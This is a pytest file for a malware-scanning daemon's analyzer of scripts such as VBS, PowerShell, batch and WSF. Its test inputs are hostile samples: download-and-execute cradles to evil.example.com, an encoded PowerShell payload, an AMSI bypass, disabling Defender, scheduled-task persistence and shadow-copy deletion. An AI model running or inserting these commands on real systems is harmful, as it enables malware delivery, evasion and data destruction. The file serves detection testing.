# SPDX-License-Identifier: EUPL-1.2
# SPDX-FileCopyrightText: 2026 Carsten Rosenberg <c.rosenberg@heinlein-support.de>

"""Standalone script (.vbs/.js/.ps1/...) analyzer tests."""

import io
import zipfile

import pytest

import xspct_scan.daemon as xspct
from tests.conftest import (
    _keywords,
)


class TestAnalyzeScript:
    def test_empty_bytes_returns_none(self, daemon):
        assert daemon.analyze_script(b"", "empty.vbs") is None

    def test_vbs_shell_and_createobject_detected(self, daemon):
        vbs = b'Set o = CreateObject("WScript.Shell")\no.Run "cmd /c whoami"'
        result = daemon.analyze_script(vbs, "drop.vbs")
        assert result is not None
        kws = _keywords(result["analyses"])
        assert "CreateObject" in kws or "WScript.Shell" in kws

    def test_vbs_fallback_without_oletools(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_OLETOOLS", False)
        vbs = b'Set o = CreateObject("WScript.Shell")\nExecuteGlobal "x"'
        result = daemon.analyze_script(vbs, "drop.vbs")
        kws = _keywords(result["analyses"])
        assert "CreateObject()" in kws
        assert "ExecuteGlobal" in kws

    def test_vbs_chr_chain_obfuscation_fallback(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_OLETOOLS", False)
        vbs = b"x = " + b" & ".join(f"Chr({i})".encode() for i in range(65, 75))
        result = daemon.analyze_script(vbs, "obf.vbs")
        assert "Chr()-chain" in _keywords(result["analyses"])

    def test_vbs_executable_filename_ioc_not_dropped(self, daemon):
        """extract_iocs() only extracts urls/ips/domains, not the executable
        filenames oletools' VBA_Scanner separately flags as an IOC — those
        hits must survive, unlike its plain URL/IPv4 hits which
        extract_iocs() already covers on the same raw text."""
        vbs = b'Set o = CreateObject("Outlook.Application")\nx = "payload.exe"'
        result = daemon.analyze_script(vbs, "drop.vbs")
        kws = _keywords(result["analyses"])
        assert "payload.exe" in kws

    def test_vbs_plain_url_ioc_not_duplicated_in_analyses(self, daemon):
        """Plain (non-obfuscated) URL/IPv4 IOC hits from VBA_Scanner are
        redundant with extract_iocs() on the same raw text and must not
        also appear as a separate 'analyses' entry."""
        vbs = b'x = "http://evil.example.com/payload.exe"'
        result = daemon.analyze_script(vbs, "drop.vbs")
        assert "http://evil.example.com/payload.exe" in result["iocs"]["urls"]
        assert "http://evil.example.com/payload.exe" not in _keywords(
            result["analyses"]
        )

    def test_standalone_js_reuses_analyze_javascript(self, daemon):
        js = b'eval(unescape("%61%6c%65%72%74"))'
        result = daemon.analyze_script(js, "mal.js")
        kws = _keywords(result["analyses"])
        assert "eval()" in kws
        assert "unescape()" in kws

    def test_text_segment_source_is_script(self, daemon):
        result = daemon.analyze_script(b"whoami", "run.bat")
        sources = {s["source"] for s in result["text_segments"]}
        assert "script" in sources

    def test_ps1_encoded_command_decoded_and_reanalyzed(self, daemon):
        import base64 as _b64

        cmd = (
            "IEX (New-Object Net.WebClient).DownloadString"
            '("http://evil.example.com/a.ps1")'
        )
        b64 = _b64.b64encode(cmd.encode("utf-16-le")).decode()
        ps1 = f"powershell.exe -EncodedCommand {b64}".encode()
        result = daemon.analyze_script(ps1, "run.ps1")
        kws = _keywords(result["analyses"])
        assert "-EncodedCommand" in kws
        assert "-EncodedCommand-decoded" in kws
        assert "Invoke-Expression" in kws
        assert "download-cradle" in kws
        # -EncodedCommand usage and its decoded-payload marker are distinct
        # findings, not duplicates of each other.
        all_kws = [a["keyword"] for a in result["analyses"]]
        assert all_kws.count("-EncodedCommand") == 1
        assert all_kws.count("-EncodedCommand-decoded") == 1
        sources = {s["source"] for s in result["text_segments"]}
        assert "script-decoded" in sources

    def test_ps1_encoded_command_colon_syntax_decoded(self, daemon):
        """-EncodedCommand:<base64> (colon-bound, no space) must also decode."""
        import base64 as _b64

        cmd = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1')"
        b64 = _b64.b64encode(cmd.encode("utf-16-le")).decode()
        ps1 = f"powershell.exe -EncodedCommand:{b64}".encode()
        result = daemon.analyze_script(ps1, "run.ps1")
        sources = {s["source"] for s in result["text_segments"]}
        assert "script-decoded" in sources

    def test_ps1_download_cradle_and_amsi_bypass(self, daemon):
        ps1 = (
            b"Invoke-WebRequest -Uri http://evil.example.com/x.exe -OutFile x.exe\n"
            b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        )
        result = daemon.analyze_script(ps1, "loader.ps1")
        kws = _keywords(result["analyses"])
        assert "download-cradle" in kws
        assert "AMSI-bypass" in kws

    def test_script_patterns_are_case_insensitive(self, daemon):
        ps1 = (
            b"invoke-webrequest http://evil.example.com/x.exe\n"
            b"start-process x.exe\n"
            b"set-mppreference -disablerealtimemonitoring true"
        )
        result = daemon.analyze_script(ps1, "loader.ps1")
        kws = _keywords(result["analyses"])
        assert {"download-cradle", "process-creation", "MpPreference"} <= kws

    def test_ps1_persistence_pattern(self, daemon):
        ps1 = b"schtasks /create /tn evil /tr evil.exe /sc onlogon"
        result = daemon.analyze_script(ps1, "persist.ps1")
        assert "persistence" in _keywords(result["analyses"])

    @pytest.mark.parametrize("ext", ["bat", "cmd"])
    def test_batch_certutil_and_shadow_copy_deletion(self, daemon, ext):
        bat = (
            b"@echo off\r\n"
            b"certutil -urlcache -f http://evil.example.com/x.exe x.exe\r\n"
            b"vssadmin delete shadows /all /quiet\r\n"
        )
        result = daemon.analyze_script(bat, f"wiper.{ext}")
        kws = _keywords(result["analyses"])
        assert "certutil" in kws
        assert "shadow-copy-deletion" in kws

    def test_batch_self_delete(self, daemon):
        bat = b"del /f /q %~f0"
        result = daemon.analyze_script(bat, "run.bat")
        assert "self-delete" in _keywords(result["analyses"])

    def test_obfuscation_density_flagged(self, daemon):
        ps1 = ("$x = " + " + ".join(f'"{i}"' for i in range(30))).encode()
        result = daemon.analyze_script(ps1, "obf.ps1")
        assert "high-obfuscation-density" in _keywords(result["analyses"])

    def test_wsf_routes_blocks_by_language(self, daemon):
        wsf = b"""<job>
<script language="VBScript">
Set o = CreateObject("WScript.Shell")
</script>
<script language="JScript">
eval(unescape("foo"))
</script>
</job>"""
        result = daemon.analyze_script(wsf, "drop.wsf")
        kws = _keywords(result["analyses"])
        assert "CreateObject" in kws or "CreateObject()" in kws
        assert "eval()" in kws

    def test_wsf_no_script_blocks_flagged(self, daemon):
        result = daemon.analyze_script(b"<job><notscript/></job>", "empty.wsf")
        assert "wsf-no-script-blocks" in _keywords(result["analyses"])

    def test_wsf_short_form_language_values(self, daemon):
        """language="VBS"/"JS" (short forms) must still be routed and scanned,
        not just the full "VBScript"/"JScript" spellings."""
        wsf = b"""<job>
<script language="VBS">
Set o = CreateObject("WScript.Shell")
</script>
<script language="JS">
eval(unescape("foo"))
</script>
</job>"""
        result = daemon.analyze_script(wsf, "drop.wsf")
        kws = _keywords(result["analyses"])
        assert "CreateObject" in kws or "CreateObject()" in kws
        assert "eval()" in kws

    def test_wsf_cdata_wrapped_block_unwrapped(self, daemon):
        wsf = b"""<job><script language="JScript"><![CDATA[
eval(unescape("foo"))
]]></script></job>"""
        result = daemon.analyze_script(wsf, "drop.wsf")
        assert "eval()" in _keywords(result["analyses"])

    @pytest.mark.parametrize(
        ("language", "decoded", "keyword"),
        [
            ("VBScript.Encode", 'CreateObject("WScript.Shell")', "WScript.Shell"),
            ("JScript.Encode", 'eval(unescape("foo"))', "eval()"),
        ],
    )
    def test_wsf_encoded_blocks_are_decoded(
        self, daemon, monkeypatch, language, decoded, keyword
    ):
        monkeypatch.setattr(
            xspct.InspectorDaemon,
            "_decode_vbe_jse",
            lambda self, text: decoded,
        )
        wsf = (
            f'<job><script language="{language}">#@~^encoded^#~@</script></job>'
        ).encode()
        result = daemon.analyze_script(wsf, "drop.wsf")
        assert keyword in _keywords(result["analyses"])
        assert "script-decoded" in {
            segment["source"] for segment in result["text_segments"]
        }

    def test_wsf_encoded_block_decode_failure_is_reported(self, daemon, monkeypatch):
        monkeypatch.setattr(
            xspct.InspectorDaemon,
            "_decode_vbe_jse",
            lambda self, text: None,
        )
        wsf = b'<job><script language="JScript.Encode">#@~^encoded^#~@</script></job>'
        result = daemon.analyze_script(wsf, "drop.wsf")
        assert "wsf-jscript.encode-undecoded" in _keywords(result["analyses"])

    def test_vbe_undecoded_without_sflock(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", False)
        result = daemon.analyze_script(b"#@~^AAAA==garbage==^#~@", "enc.vbe")
        assert "vbe-undecoded" in _keywords(result["analyses"])

    def test_vbe_decoded_reanalyzed_as_vbs(self, daemon, monkeypatch):
        monkeypatch.setattr(
            xspct.InspectorDaemon,
            "_decode_vbe_jse",
            lambda self, text: 'CreateObject("WScript.Shell")',
        )
        result = daemon.analyze_script(b"#@~^AAAA==garbage==^#~@", "enc.vbe")
        kws = _keywords(result["analyses"])
        assert "CreateObject" in kws or "CreateObject()" in kws
        sources = {s["source"] for s in result["text_segments"]}
        assert "script-decoded" in sources

    def test_vbe_decoded_text_contributes_iocs(self, daemon, monkeypatch):
        monkeypatch.setattr(
            xspct.InspectorDaemon,
            "_decode_vbe_jse",
            lambda self, text: 'u = "http://decoded.example.com/payload"',
        )
        result = daemon.analyze_script(b"#@~^encoded-only^#~@", "enc.vbe")
        assert "http://decoded.example.com/payload" in result["iocs"]["urls"]

    def test_wsf_block_iocs_extracted_from_whole_document(self, daemon):
        """IOCs inside a WSF <script> block are found via the single
        whole-document extract_iocs(data) call at the top of analyze_script()
        — there's no separate per-block extraction (that would just rescan
        bytes already covered, since each block's code is a substring of the
        full document)."""
        wsf = (
            b'<job><script language="JScript">'
            b'var u = "http://block.example.com/payload";'
            b"</script></job>"
        )
        result = daemon.analyze_script(wsf, "drop.wsf")
        assert "http://block.example.com/payload" in result["iocs"]["urls"]

    def test_jse_decoded_reanalyzed_as_js(self, daemon, monkeypatch):
        monkeypatch.setattr(
            xspct.InspectorDaemon,
            "_decode_vbe_jse",
            lambda self, text: 'eval(unescape("foo"))',
        )
        result = daemon.analyze_script(b"#@~^AAAA==garbage==^#~@", "enc.jse")
        assert "eval()" in _keywords(result["analyses"])

    def test_iocs_extracted(self, daemon):
        data = b"powershell -c IEX http://evil.example.com/payload"
        result = daemon.analyze_script(data, "run.ps1")
        assert result["iocs"] is not None


# ===========================================================================
# UNIT TESTS — analyze_lnk (Windows shortcut / .lnk)
# ===========================================================================


class TestScriptTypePipeline:
    @pytest.mark.asyncio
    async def test_ps1_file_detected_and_analysed(self, client):
        payload = b"IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1')"
        resp = await client.post(
            "/v1/scan?filename=run.ps1",
            data=payload,
            headers={"Content-Type": "application/octet-stream"},
        )
        assert resp.status == 200
        body = await resp.json()
        assert body["file"]["type"] == "script"
        # The magic-only detection pass would also match "text" for plain
        # ASCII script source; the redundant "text" analyzer must not run
        # alongside "script" for the same data.
        assert "text" not in body["scan"]["analyzers"]["completed"]
        findings = {f["keyword"] for f in body.get("findings", [])}
        assert "download-cradle" in findings

    @pytest.mark.asyncio
    async def test_ps1_falls_back_to_text_when_script_analyzer_disabled(self, client):
        """When xspct_analyzers.script.enabled is False, a .ps1 upload must
        still be scanned by the text analyzer (regression: the magic-only
        detection pass always classifies plain-ASCII script source as
        "text" too, and that "text" entry used to be discarded unconditionally
        as soon as "script" was also detected — even when script was
        disabled — leaving the file completely unanalyzed)."""
        saved = xspct.config["xspct_analyzers"]["script"]["enabled"]
        xspct.config["xspct_analyzers"]["script"]["enabled"] = False
        try:
            payload = b"IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1')"
            resp = await client.post(
                "/v1/scan?filename=run.ps1",
                data=payload,
                headers={"Content-Type": "application/octet-stream"},
            )
        finally:
            xspct.config["xspct_analyzers"]["script"]["enabled"] = saved
        assert resp.status == 200
        body = await resp.json()
        assert "script" not in body["scan"]["analyzers"]["completed"]
        assert "text" in body["scan"]["analyzers"]["completed"]

    @pytest.mark.skipif(not xspct.HAS_SFLOCK, reason="SFlock2 not installed")
    def test_archive_ps1_falls_back_to_text_when_script_analyzer_disabled(
        self, daemon, monkeypatch
    ):

        monkeypatch.setitem(xspct.config["xspct_analyzers"]["script"], "enabled", False)
        archive_data = io.BytesIO()
        with zipfile.ZipFile(archive_data, "w") as archive:
            archive.writestr("loader.ps1", "whoami")
        result = daemon.analyze_archive("test", "scripts.zip", archive_data.getvalue())
        member = result["archive_files"][0]
        assert member["detected_type"] == "script"
        assert "text" in member["analyzers_run"]
        assert "script" not in member["analyzers_run"]
        assert "text" in {segment["source"] for segment in result["text_segments"]}

    @pytest.mark.asyncio
    async def test_hta_file_detected_as_html(self, client):
        payload = b'<html><head><HTA:APPLICATION SHOWINTASKBAR="no"/></head></html>'
        resp = await client.post(
            "/v1/scan?filename=dropper.hta",
            data=payload,
            headers={"Content-Type": "application/octet-stream"},
        )
        assert resp.status == 200
        body = await resp.json()
        assert body["file"]["type"] == "html"
        findings = {f["keyword"] for f in body.get("findings", [])}
        assert "SHOWINTASKBAR" in findings

    @pytest.mark.asyncio
    async def test_script_analyzer_disabled_skips_method(self, aiohttp_client):
        saved = xspct.config["xspct_analyzers"]["script"]["enabled"]
        xspct.config["xspct_analyzers"]["script"]["enabled"] = False
        app = await xspct.make_app()
        client = await aiohttp_client(app)
        try:
            resp = await client.post(
                "/v1/scan?filename=run.ps1",
                data=b"whoami",
                headers={"Content-Type": "application/octet-stream"},
            )
            assert resp.status == 200
        finally:
            xspct.config["xspct_analyzers"]["script"]["enabled"] = saved
